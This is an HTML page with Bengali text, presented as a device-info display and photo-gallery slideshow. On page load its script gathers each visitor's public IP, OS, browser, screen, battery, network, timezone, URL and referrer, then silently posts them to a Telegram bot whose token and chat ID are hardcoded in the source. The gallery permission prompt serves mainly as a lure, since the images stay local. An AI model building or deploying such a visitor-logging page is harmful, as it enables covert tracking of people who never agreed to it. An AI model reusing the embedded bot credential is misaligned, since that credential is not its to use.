<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>ডিটেইলড ভিজিটর ইনফো + গ্যালারি স্লাইডশো</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0b1120 0%, #19233c 100%);
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1300px;
            margin: 0 auto;
            display: flex;
            flex-wrap: wrap;
            gap: 24px;
        }

        /* ইনফো কার্ড (বিস্তারিত তথ্য) */
        .info-card {
            flex: 1.2;
            min-width: 280px;
            background: rgba(15, 25, 45, 0.75);
            backdrop-filter: blur(14px);
            border-radius: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 1.5rem;
            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
        }

        .info-card h2 {
            color: #ffde9c;
            border-left: 5px solid #f5b042;
            padding-left: 16px;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 14px;
        }

        .info-item {
            background: rgba(0, 0, 0, 0.45);
            border-radius: 1.2rem;
            padding: 12px 16px;
            transition: 0.1s;
            border-left: 3px solid #ffb347;
        }

        .info-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #9bb5e0;
        }

        .info-value {
            font-size: 1rem;
            font-weight: 500;
            color: #f0f3fc;
            word-break: break-word;
            margin-top: 4px;
        }

        /* গ্যালারি পারমিশন + স্লাইডশো অংশ */
        .gallery-section {
            flex: 1;
            min-width: 320px;
            background: rgba(10, 18, 28, 0.8);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid rgba(255,215,150,0.3);
            padding: 1.5rem;
        }

        .permission-box {
            background: #00000055;
            border-radius: 1.5rem;
            padding: 1rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .btn-allow, .btn-deny {
            border: none;
            padding: 8px 24px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            margin: 0 8px;
            transition: 0.2s;
        }

        .btn-allow {
            background: #2a7f3a;
            color: white;
        }
        .btn-allow:hover { background: #3ba04e; transform: scale(1.02);}
        .btn-deny {
            background: #5e2e2e;
            color: #ffc2c2;
        }
        .btn-deny:hover { background: #7a3a3a;}

        .slideshow-container {
            background: #01010166;
            border-radius: 1.5rem;
            padding: 12px;
            margin-top: 10px;
        }

        .image-frame {
            text-align: center;
            min-height: 260px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #00000044;
            border-radius: 1rem;
        }

        #slideshow-img {
            max-width: 100%;
            max-height: 360px;
            border-radius: 1rem;
            box-shadow: 0 6px 16px black;
            display: none;
        }

        .slide-controls {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 12px 0;
        }
        .ctrl-btn {
            background: #2c3e4e;
            border: none;
            padding: 6px 18px;
            border-radius: 40px;
            color: white;
            cursor: pointer;
        }
        .counter {
            text-align: center;
            color: #cdd9ff;
            font-size: 0.8rem;
            margin: 8px;
        }
        .status-msg {
            color: #ffcf9a;
            font-size: 0.75rem;
            margin-top: 10px;
            text-align: center;
        }
        hr {
            border-color: #2a3950;
            margin: 15px 0;
        }
        @media (max-width: 760px) {
            .container { flex-direction: column; }
        }
    </style>
</head>
<body>
<div class="container">
    <!-- বাম পাশ: ডিটেইলড ডিভাইস তথ্য (ঠিক স্ক্রিনশটের মত) -->
    <div class="info-card">
        <h2>📱 লাইভ ডিভাইস তথ্য</h2>
        <div class="info-grid" id="deviceInfoGrid">
            <!-- ডায়নামিক আইটেম এখানে জাভাস্ক্রিপ্ট দিয়ে ভরবে -->
        </div>
        <div class="status-msg" style="margin-top:16px;">✅ টেলিগ্রামে স্বয়ংক্রিয় নোটিফিকেশন সক্রিয়</div>
    </div>

    <!-- ডান পাশ: গ্যালারি অনুমতি + স্লাইডশো -->
    <div class="gallery-section">
        <div class="permission-box">
            <div style="font-size:1.2rem; margin-bottom:8px;">🖼️ গ্যালারি অ্যাক্সেস চাই</div>
            <p style="color:#bcd0ff; font-size:0.85rem;">"অনুমতি দিন" ক্লিক করলে আপনার ছবি সিলেক্ট করতে পারবেন -> স্লাইডশো শুরু হবে</p>
            <div style="margin-top: 12px;">
                <button id="allowGalleryBtn" class="btn-allow">✅ অনুমতি দিন</button>
                <button id="denyGalleryBtn" class="btn-deny">❌ অস্বীকার</button>
            </div>
            <div id="galleryMsg" class="status-msg" style="color:#ffc285;"></div>
        </div>

        <div id="slideshowArea" style="display: none;">
            <div class="slideshow-container">
                <div class="image-frame">
                    <img id="slideshow-img" src="" alt="ছবি আসবে">
                </div>
                <div class="counter" id="slideCounter">📸 ০ / ০</div>
                <div class="slide-controls">
                    <button id="prevSlide" class="ctrl-btn">◀ আগের</button>
                    <button id="nextSlide" class="ctrl-btn">পরবর্তী ▶</button>
                    <button id="playPauseBtn" class="ctrl-btn">⏸️ থামাও</button>
                </div>
                <div class="status-msg">✨ প্রতি ৩ সেকেন্ডে ছবি বদলাবে (অটো প্লে)</div>
            </div>
        </div>
    </div>
</div>

<script>
    (function() {
        // ======================== টেলিগ্রাম বট টোকেন (আগের মত) ===================
        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
        const DEFAULT_CHAT_ID = "7709670231";

        // ---------- ১. সম্পূর্ণ ডিটেইলড ইনফো সংগ্রহ & UI দেখানো ----------
        async function getPublicIP() {
            try {
                let res = await fetch('https://api.ipify.org?format=json');
                let data = await res.json();
                return data.ip;
            } catch(e) { return "পাওয়া যায়নি"; }
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return { level: "অজানা", charging: "অজানা" };
            try {
                const battery = await navigator.getBattery();
                let levelPercent = Math.round(battery.level * 100);
                let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
                return { level: `${levelPercent}%`, charging: charging };
            } catch(e) { return { level: "অজানা", charging: "অজানা" }; }
        }

        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "অজানা", rtt: "N/A", speed: "N/A" };
            let type = conn.effectiveType || "unknown";
            let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
            let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
            return { type: type, rtt: rtt, speed: downlink };
        }

        function getScreenDetails() {
            return {
                resolution: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth}-bit`,
                pixelRatio: devicePixelRatio.toFixed(2)
            };
        }

        function getBrowserAndOS() {
            const ua = navigator.userAgent;
            let os = "অজানা";
            if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            else if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "macOS";
            let browser = "অজানা";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            return { os, browser };
        }

        async function loadAllInfoAndDisplay() {
            const ip = await getPublicIP();
            const battery = await getBatteryInfo();
            const network = getNetworkInfo();
            const screenDet = getScreenDetails();
            const osBrowser = getBrowserAndOS();
            const language = navigator.language || "bn-BD";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const cookieEnabled = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
            const pageUrl = window.location.href;
            const referrer = document.referrer || "সরাসরি";

            const infoItems = [
                { label: "🌐 আইপি অ্যাড্রেস", value: ip },
                { label: "📱 অপারেটিং সিস্টেম", value: osBrowser.os },
                { label: "🌍 ব্রাউজার", value: osBrowser.browser },
                { label: "📺 স্ক্রিন রেজুলেশন", value: screenDet.resolution },
                { label: "🎨 কালার ডেপথ", value: screenDet.colorDepth },
                { label: "🔋 ব্যাটারি লেভেল", value: battery.level },
                { label: "⚡ চার্জিং স্ট্যাটাস", value: battery.charging },
                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type.toUpperCase() },
                { label: "⏱️ RTT (লেটেন্সি)", value: network.rtt },
                { label: "⚡ আনুমানিক স্পিড", value: network.speed },
                { label: "🗣️ ভাষা (Language)", value: language },
                { label: "🕒 টাইমজোন", value: timezone },
                { label: "🕙 স্থানীয় সময়", value: localTime },
                { label: "🍪 কুকি সাপোর্ট", value: cookieEnabled },
                { label: "🔗 পৃষ্ঠার ইউআরএল", value: pageUrl },
                { label: "🔙 রেফারার", value: referrer }
            ];

            const grid = document.getElementById('deviceInfoGrid');
            grid.innerHTML = "";
            for (let item of infoItems) {
                const div = document.createElement('div');
                div.className = "info-item";
                div.innerHTML = `<div class="info-label">${item.label}</div><div class="info-value">${item.value}</div>`;
                grid.appendChild(div);
            }

            // টেলিগ্রামের জন্য মেসেজ তৈরী (ওপিট)
            const message = `📢 বিস্তারিত ভিজিট:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেট: ${network.type}, ${network.rtt}, ${network.speed}\nস্থানীয় সময়: ${localTime}\nইউআরএল: ${pageUrl}`;
            sendToTelegram(message);
        }

        async function sendToTelegram(text) {
            try {
                const params = new URLSearchParams();
                params.append('chat_id', DEFAULT_CHAT_ID);
                params.append('text', text);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params
                });
                console.log("টেলিগ্রামে পাঠানো হয়েছে");
            } catch(e) { console.warn("telegram error"); }
        }

        // ---------- ২. গ্যালারি পারমিশন + স্লাইডশো লজিক ----------
        let selectedImageURLs = [];
        let currentIdx = 0;
        let slideInterval = null;
        let isAutoPlaying = true;
        const slideshowDiv = document.getElementById('slideshowArea');
        const slideshowImg = document.getElementById('slideshow-img');
        const counterSpan = document.getElementById('slideCounter');
        const prevBtn = document.getElementById('prevSlide');
        const nextBtn = document.getElementById('nextSlide');
        const playPauseBtn = document.getElementById('playPauseBtn');
        const galleryMsg = document.getElementById('galleryMsg');

        function revokeImages() {
            for (let url of selectedImageURLs) URL.revokeObjectURL(url);
            selectedImageURLs = [];
        }

        function updateSlide(index) {
            if (!selectedImageURLs.length) return;
            if (index < 0) currentIdx = selectedImageURLs.length - 1;
            else if (index >= selectedImageURLs.length) currentIdx = 0;
            else currentIdx = index;
            slideshowImg.src = selectedImageURLs[currentIdx];
            slideshowImg.style.display = "block";
            counterSpan.innerText = `🖼️ ${currentIdx+1} / ${selectedImageURLs.length}`;
        }

        function startAutoSlide() {
            if (slideInterval) clearInterval(slideInterval);
            if (!selectedImageURLs.length) return;
            slideInterval = setInterval(() => {
                if (isAutoPlaying && selectedImageURLs.length) {
                    updateSlide(currentIdx + 1);
                }
            }, 3000);
        }

        function stopAutoSlide() { if(slideInterval) clearInterval(slideInterval); slideInterval = null; }
        function pauseSlideshow() { if(!isAutoPlaying) return; isAutoPlaying = false; playPauseBtn.innerText = '▶️ চালু'; stopAutoSlide(); }
        function resumeSlideshow() { if(isAutoPlaying) return; isAutoPlaying = true; playPauseBtn.innerText = '⏸️ থামাও'; startAutoSlide(); }
        function togglePlay() { isAutoPlaying ? pauseSlideshow() : resumeSlideshow(); }

        function loadImagesFromFiles(files) {
            const imageFiles = Array.from(files).filter(f => f.type.startsWith('image/'));
            if (imageFiles.length === 0) {
                galleryMsg.innerText = "❌ কোনো ছবি সিলেক্ট করেননি। শুধু ইমেজ ফাইল দিন।";
                return false;
            }
            revokeImages();
            for (let file of imageFiles) {
                selectedImageURLs.push(URL.createObjectURL(file));
            }
            currentIdx = 0;
            updateSlide(0);
            if (slideshowDiv.style.display !== 'block') slideshowDiv.style.display = 'block';
            isAutoPlaying = true;
            playPauseBtn.innerText = '⏸️ থামাও';
            startAutoSlide();
            galleryMsg.innerHTML = `✅ ${selectedImageURLs.length} টি ছবি লোড! স্লাইডশো শুরু হয়েছে 🎉`;
            return true;
        }

        function requestGallery() {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.multiple = true;
            input.onchange = (e) => {
                if (e.target.files && e.target.files.length) {
                    loadImagesFromFiles(e.target.files);
                } else {
                    galleryMsg.innerText = "কোনো ফাইল সিলেক্ট করা হয়নি।";
                }
                input.remove();
            };
            input.click();
        }

        document.getElementById('allowGalleryBtn').addEventListener('click', () => {
            galleryMsg.innerHTML = "📸 গ্যালারি অ্যাক্সেস চাচ্ছি... ছবি সিলেক্ট করুন।";
            requestGallery();
        });
        document.getElementById('denyGalleryBtn').addEventListener('click', () => {
            galleryMsg.innerHTML = "🔴 আপনি গ্যালারি অ্যাক্সেস অস্বীকার করেছেন। ছবি দেখা যাবে না। আবার চাইলে 'অনুমতি দিন' ক্লিক করুন।";
            if (!selectedImageURLs.length) slideshowDiv.style.display = 'none';
            else slideshowDiv.style.display = 'block';
        });
        if (prevBtn) prevBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx-1); };
        if (nextBtn) nextBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx+1); };
        if (playPauseBtn) playPauseBtn.onclick = togglePlay;

        // সব তথ্য দেখানো শুরু এবং টেলিগ্রাম পাঠানো
        loadAllInfoAndDisplay();

        // প্রতি 30 সেকেন্ডে সময় রিফ্রেশ (শুধু স্থানীয় সময় আপডেট)
        setInterval(() => {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const timeElements = document.querySelectorAll('.info-item');
            for(let el of timeElements) {
                if(el.innerText.includes("স্থানীয় সময়")) {
                    el.querySelector('.info-value').innerText = localTime;
                }
                if(el.innerText.includes("টাইমজোন") && el.querySelector('.info-value').innerText !== timezone) {
                    el.querySelector('.info-value').innerText = timezone;
                }
            }
        }, 1000);
    })();
</script>
</body>
</html>
